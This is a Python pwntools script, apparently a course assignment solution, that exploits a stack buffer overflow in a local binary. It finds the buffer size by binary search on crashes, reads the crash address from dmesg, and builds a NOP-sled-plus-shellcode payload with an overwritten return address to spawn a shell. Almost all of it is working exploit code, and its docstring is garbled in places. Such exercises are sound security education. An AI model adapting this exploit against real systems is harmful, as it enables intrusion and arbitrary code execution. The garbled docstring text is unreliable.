from pwn import *
from shellcode import get_shellcode

pwnlib.term.term_mode= False
#FULL_BUFF_SIZE = BUFF_SIZE * 2

CYCLIC_LEN = 512
SLED_SIZE = 128
EPB = 12 
START_LEN = 500
END_LEN = 2000

# =============================================
# ========= write your code below  ============
# =============================================



''' returns the payload for the attack 
    given the path to the vulnerable binary
    and the shell fcod fe from get_shellcode in shellcode.py
    (string, bytes) -> (b the vulnerable binary
    and the shellcode frytes, bytes)
'''    
def craft_payload(path_to_vuln_prgm, shellcode):
    buf_size = find_buffer_size(path_to_vuln_prgm)
    buf_address, input_len = find_buff_address(path_to_vuln_prgm, buf_size)
    payload_1 = get_first_payload(buf_address, input_len)
    payload_2 = get_second_payload(buf_size, shellcode)
    return (payload_1, payload_2)

def find_buff_address(path_to_vuln_prgm, buf_size):

    c = cyclic(CYCLIC_LEN)
    p = process([path_to_vuln_prgm, c, b"z" * buf_size])
    p.wait_for_close()
    debug_info = process('dmesg | grep "vuln" | tail -n 1', stdout=subprocess.PIPE, shell=True).recvall()
    eip =  int(re.search(b'at\ (.*)\ ip', debug_info).group(1), 16)
    x = cyclic_find(p32(eip))
    sp = int(re.search(b'sp\ (.*)\ error', debug_info).group(1), 16)

    print(x)

    buf_address = sp - (x + 4 + buf_size + CYCLIC_LEN)
    buf_address += SLED_SIZE // 2
    input_len = ((x + 4 + CYCLIC_LEN) // 2)
    buf_address += input_len


    return (buf_address, input_len)

# theres probably a MUCH better way to find the length of this buffer.
# unfortunately for ME i have no idea what it is, so I'm doing a binary 
# search to hone in on the correct size.
def find_buffer_size(path_to_vuln_prgm):

    start = START_LEN
    end = END_LEN
    found = False

    while not found:
        curr_Len = (start + end) // 2

        p1 = process([path_to_vuln_prgm, b'a'*(curr_Len -1), b''])
        p2 = process([path_to_vuln_prgm, b'a'*curr_Len, b''])

        p1.wait_for_close()
        p2.wait_for_close()

        p1_status = p1.poll()
        p2_status = p2.poll()

        print(curr_Len)

        # both worked, search upper half
        if p1_status == 0 and p2_status == 0:
            start = curr_Len
        # neither worked, use lower half
        elif p1_status != 0 and p2_status != 0:
            end = curr_Len
        else:
            found = True
    return curr_Len


def get_first_payload(buf_address, input_len):
    return b'a'*(input_len - 4) + p32(buf_address)
    
def get_second_payload(buf_size, shellcode):
    # padding will overflow into first payload and write redirect over return addr
    
    padding_len = buf_size - (len(shellcode) + SLED_SIZE)
    payload = b'\x90'*SLED_SIZE + shellcode + b'b'*padding_len
    return payload

# =============================================
# ===== do not modify the code below ==========
# =============================================

def execute_interactive(path_to_vuln_prgm, payload):
    p = process([path_to_vuln_prgm, payload[0], payload[1]])
    p.interactive()
    
def execute_non_interactive(path_to_vuln_prgm, payload):
    p = process([path_to_vuln_prgm, payload[0], payload[1]])
    sys.stdout.buffer.write(p.recvall())

def run(path_to_vuln_prgm):
    interactive, shellcode = get_shellcode()
    payload = craft_payload(path_to_vuln_prgm, shellcode)
    if interactive:
       execute_interactive(path_to_vuln_prgm, payload)
    else:
       execute_non_interactive(path_to_vuln_prgm, payload)
    
if __name__ == "__main__":
   import os, sys, getopt
   def usage():
        print('Usage:    ' + os.path.basename(__file__) + ' path_to_vuln_prgm')
        sys.exit(2)
   try:
      opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
   except getopt.GetoptError as err:
      print(err)
      usage()
   # extract parameters
   path_to_vuln_prgm = args[0] if len(args) > 0 else None
   for opt, arg in opts:
        if opt in ("-h", "--help"):
           usage()
   # check arguments
   if (path_to_vuln_prgm is None):
       print('path_to_vuln_prgm is missing\n')
       usage()
   # run the command
   run(path_to_vuln_prgm)
